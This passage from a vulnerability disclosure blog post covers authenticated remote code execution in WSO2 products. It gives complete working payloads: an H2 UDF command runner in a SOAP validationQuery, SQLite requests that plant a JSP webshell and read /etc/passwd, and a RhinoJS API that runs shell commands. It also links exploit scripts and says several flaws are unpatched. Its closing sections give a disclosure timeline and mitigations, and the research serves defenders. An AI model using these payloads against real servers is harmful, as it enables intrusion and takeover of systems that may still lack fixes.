    throw new RuntimeException("CMD OUTPUT:\n" + sb.toString());
}
$$;
CALL EXEC_READ('id');
```

To execute this UDF against the H2 database, a SOAP request is sent to the `NDataSourceAdmin` service. The UDF is embedded in the `validationQuery` parameter of the database configuration:

```html
POST /services/NDataSourceAdmin.NDataSourceAdminHttpsSoap12Endpoint/ HTTP/1.1
Host: victim-host:9443
Content-Type: application/soap+xml;charset=UTF-8
SOAPAction: "urn:testDataSourceConnection"
Authorization: Basic <creds>

<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
               xmlns:ser="http://org.apache.axis2/xsd"
               xmlns:xsd="http://org.apache.axis2/xsd"
               xmlns:core="http://core.ndatasource.carbon.wso2.org/xsd">
    <soap:Header/>
    <soap:Body>
        <ser:testDataSourceConnection>
            <ser:dsmInfo>
                <xsd:definition>
                    <xsd:dsXMLConfiguration>
                        <![CDATA[
                        <configuration xmlns:svns="http://org.wso2.securevault/configuration">
                            <url>jdbc:h2:/tmp/exploit-h2.db;DB_CLOSE_ON_EXIT=FALSE;LOCK_TIMEOUT=60000</url>
                            <username></username>
                            <password></password>
                            <driverClassName>org.h2.Driver</driverClassName>
                            <maxActive>50</maxActive>
                            <maxWait>60000</maxWait>
                            <testOnBorrow>true</testOnBorrow>
                            <validationQuery>
                                DROP ALIAS IF EXISTS EXEC_READ;
                                CREATE ALIAS EXEC_READ AS $$
                                String execRead(String cmd) throws Exception {
                                    Process p = Runtime.getRuntime().exec(cmd);
                                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                    StringBuilder sb = new StringBuilder();
                                    String line;
                                    while ((line = br.readLine()) != null) {
                                        sb.append(line).append("\n");
                                    }
                                    throw new RuntimeException("CMD OUTPUT:\n" + sb.toString());
                                }
                                $$;
                                CALL EXEC_READ('id');
                            </validationQuery>
                            <validationInterval>30000</validationInterval>
                            <defaultAutoCommit>true</defaultAutoCommit>
                        </configuration>
                        ]]>
                    </xsd:dsXMLConfiguration>
                    <xsd:type>RDBMS</xsd:type>
                </xsd:definition>
                <xsd:description>Test H2 Database Connection</xsd:description>
                <xsd:jndiConfig>
                    <core:name>jdbc/TestH2DB</core:name>
                    <core:useDataSourceFactory>false</core:useDataSourceFactory>
                </xsd:jndiConfig>
                <xsd:name>TEST_H2_DB</xsd:name>
                <xsd:system>false</xsd:system>
            </ser:dsmInfo>
        </ser:testDataSourceConnection>
    </soap:Body>
</soap:Envelope>
```

The command output is returned in the SOAP fault, confirming successful execution. A Python exploit script is available [here](https://github.com/ambionics/wso2-exploits/tree/main/rce/authenticated/h2-rce).

> 💡 This is an error-based exploitation technique.  
> The \`validationQuery\` is crafted to execute the command and then throw an exception, forcing the output into the error message.

## RCE via SQLite file-write

Here, we create a SQLite database file whose name ends in `.jsp`, embedding JSP code inside the binary database. The JSP engine ignores the SQLite file header (binary preamble) and executes only the `<% … %>` tags, allowing our payload to remain untransformed and run as a webshell.

The SQLite JDBC driver allows file creation in arbitrary locations through its connection parameters. This can be leveraged to write a JSP webshell. The attack process involves two steps:

1.  **Create a JSP-named database**

```html
   POST /services/NDataSourceAdmin.NDataSourceAdminHttpsSoap12Endpoint/ HTTP/1.1
   …
   <![CDATA[
   <configuration xmlns:svns="http://org.wso2.securevault/configuration">
    <url>jdbc:SQLite:./repository/deployment/server/webapps/authenticationendpoint/js/shell.jsp</url>
   …
    <validationQuery>
        CREATE TABLE IF NOT EXISTS plaintext_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            content TEXT NOT NULL COLLATE BINARY
        );
    </validationQuery>
   </configuration>
   ]]>
```

1.  **Inject the JSP payload**

```javascript
POST /services/NDataSourceAdmin.NDataSourceAdminHttpsSoap12Endpoint/ HTTP/1.1
…
<![CDATA[
<configuration xmlns:svns="http://org.wso2.securevault/configuration">
    <url>jdbc:SQLite:./repository/deployment/server/webapps/authenticationendpoint/js/shell.jsp</url>
    …
    <validationQuery>
        INSERT INTO plaintext_data (content) VALUES (CAST('&lt;%@ page import=&quot;java.io.*&quot; %&gt;
        &lt;% 
            Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); 
            BufferedReader i = new BufferedReader(new InputStreamReader(p.getInputStream())); 
            String line; 
            while ((line = i.readLine()) != null) { 
                out.println(line); 
            } 
    %&gt;' AS BLOB));
    </validationQuery>
</configuration>
]]>
```

> 💡 The `<configuration>` XML data is embedded within a parent XML document, so special characters like `<` must be properly escaped.
> 
> See the [exploit implementation](https://github.com/ambionics/wso2-exploits/blob/main/rce/authenticated/sqlite-rce/main.py) for details.

Once deployed, the file `shell.jsp` sits in the webapps directory as a valid JSP. You can then execute it directly:

```
GET /authenticationendpoint/js/shell.jsp?cmd=cat+/etc/passwd
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/1759c77c262de32d.png)

Command execution output embedded in a database file

An exploit script is available [here](https://github.com/ambionics/wso2-exploits/tree/main/rce/authenticated/sqlite-rce).

## 3\. Adding a malicious API (API Manager only)

WSO2 API Manager includes a feature that allows developers to create APIs using inline JavaScript code through its embedded RhinoJS engine. This JavaScript engine has unrestricted access to Java classes by default. A malicious API can directly execute arbitrary commands using Java classes such as [ProcessBuilder](http://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html).

Below is a short JS API implementation that reads a `cmd` query parameter, executes it, and returns the output as JSON:

```javascript
var cmd = mc.getProperty('query.param.cmd');
var p = new java.lang.ProcessBuilder("/bin/sh","-c",cmd).start();
var out = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
var sb = new java.lang.StringBuilder(), line;
while((line = out.readLine())!=null) sb.append(line).append("\n");
mc.setPayloadJSON([sb.toString()]);
```

You can deploy this API via the Management UI:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/69eab70e2c3f1eeb.png)

Deploying a malicious RhinoJS API via the UI

Or by posting a multipart/form-data request to the `APIGatewayAdmin` service:

```javascript
POST /services/APIGatewayAdmin/addApi  HTTP/1.1
Authorization: Basic ...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3TozQllGqIK1NX0N
Content-Length: 2176

------WebKitFormBoundary3TozQllGqIK1NX0N
Content-Disposition: form-data; name="apiName"

rce
------WebKitFormBoundary3TozQllGqIK1NX0N
Content-Disposition: form-data; name="apiProviderName"

admin
------WebKitFormBoundary3TozQllGqIK1NX0N
Content-Disposition: form-data; name="version"

1.0.0
------WebKitFormBoundary3TozQllGqIK1NX0N
Content-Disposition: form-data; name="apiConfig"

<api xmlns="http://ws.apache.org/ns/synapse" name="admin--rce" context="/rce">
  <resource methods="GET" url-mapping="/rce">
    <inSequence xmlns="http://ws.apache.org/ns/synapse">
      <script language="js"><![CDATA[
var cmd = mc.getProperty('query.param.cmd');
var p = new java.lang.ProcessBuilder("/bin/sh","-c",cmd).start();
var out = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
var sb = new java.lang.StringBuilder(), line;
while((line = out.readLine())!=null) sb.append(line).append("\n");
mc.setPayloadJSON([sb.toString()]);
]]></script>
      <respond/>
    </inSequence>
    <outSequence xmlns="http://ws.apache.org/ns/synapse">
      <send/>
    </outSequence>
  </resource>
</api>
------WebKitFormBoundary3TozQllGqIK1NX0N--
```

This creates an API at `http://<host>:8280/rce/rce?cmd=…` or `https://<host>:8243/rce/rce?cmd=…`. If port 8280/8243 is not directly reachable, the earlier SSRF vector ([Section B.4](#4-ssrf-with-full-request-control)) can be used to access it.

This multipart/form-data request can also be converted into a GET request and used as a CSRF sink (see [Section B.5](#5-cross-site-request-forgery)).

## 4\. RMI/JMX service exploitation

WSO2 products typically expose Java Management Extensions (JMX) services via RMI on ports `9999` (JMX) and `11111` (RMI registry). While these services are rarely internet-facing, they're frequently exposed on internal networks with the default credentials (`admin:admin`) remaining unchanged.

Authenticated attackers can leverage JMX's inherent design - which allows remote code execution via MBean operations - using tools like [beanshooter](https://github.com/qtc-de/beanshooter) 's [tonka](https://github.com/qtc-de/beanshooter#tonka) module. This provides a direct path to command execution by deploying and invoking malicious [MBeans](https://docs.oracle.com/javase/tutorial/jmx/mbeans/), making it a critical risk in environments where JMX services are accessible with weak credentials.

## E. Regarding CVE Assignment

We attempted to obtain CVE identifiers for all vulnerabilities discovered during our research. WSO2 operates as a CVE Numbering Authority (CNA), meaning vulnerability disclosures and CVE assignments for their products are handled internally.

Out of the multiple vulnerabilities we reported, WSO2 addressed and assigned a CVE identifier to only one: the Siddhi RCE via SOAP administration services ([CVE-2025-5717](https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2025/WSO2-2025-4119/) ). The remaining vulnerabilities were not remediated, and no CVEs were assigned by WSO2. We subsequently attempted to report the unaddressed vulnerabilities to MITRE directly to request CVE assignment, but we received no response to our initial report or our follow-up inquiries.

As a result, any vulnerability discussed in this article without a CVE identifier should be considered unpatched and may affect even the latest versions of WSO2 products.

## Conclusion

WSO2's shared codebase and SOAP architecture introduce a wide range of vulnerabilities — from unauthenticated RCE ([CVE-2022-29464](https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2022/WSO2-2021-1738/)), auth bypass, SSRF, CSRF, and account takeover ([CVE-2024-7097](https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3574/) / [6914](https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3561/)) to multiple authenticated RCE paths (Siddhi, H2, SQLite, JMX).

Mitigation roadmap:

-   Apply patches without delay.
-   Block `/carbon` & `/services` at the DMZ per [WSO2 security guidelines](https://apim.docs.wso2.com/en/latest/install-and-setup/setup/deployment-best-practices/security-guidelines-for-production-deployment/).
-   Run WSO2 behind hardened proxies and segmented networks.
-   Audit and disable unused SOAP services and endpoints.
-   Encourage stronger secure defaults and clearer configuration guidance.

Despite comprehensive hardening guides, most WSO2 installations continue to leave `/carbon` and `/services` exposed, and DMZ filtering alone cannot stop an attacker who is already inside. In internal penetration tests, WSO2 servers are top targets: compromising Identity Server, typically bound to Active Directory, enables interception of domain credentials and can lead to domain compromise. Stronger defaults and built-in hardening options would greatly shrink this attack surface.

## Timeline

1.  **07/24/24**: A vulnerability research project on WSO2 products began as part of LEXFO's R&D.
2.  **03/23/25**: LEXFO reported the discovered vulnerabilities to WSO2 via their responsible disclosure process.
3.  **04/28/25**: After 30 days with no response, LEXFO informed WSO2 of its 90-day disclosure policy and its intent to publish the full vulnerability details.
4.  **04/29/25**: WSO2 acknowledged the report and disclosure policy, stating that "none of the issues exceed medium severity."
5.  **06/18/25**: The WSO2 security team informed LEXFO that they would be unable to meet the 90-day deadline and requested a 60-day extension.
6.  **07/15/25**: WSO2 published an advisory for the EventProcessor Siddhi RCE vulnerability, assigning it [CVE-2025-5717](https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2025/WSO2-2025-4119/).
7.  **07/28/25**: The WSO2 security team awarded the reporting researcher a $50 Amazon gift card for the report.
8.  **09/11/25**: For the remaining unpatched vulnerabilities, LEXFO sent a CVE request and vulnerability disclosure to MITRE.
9.  **10/20/25**: This blog post was published, approximately six months after the initial disclosure. At the time of publication, the other reported vulnerabilities remained unpatched, and no response had been received from MITRE.
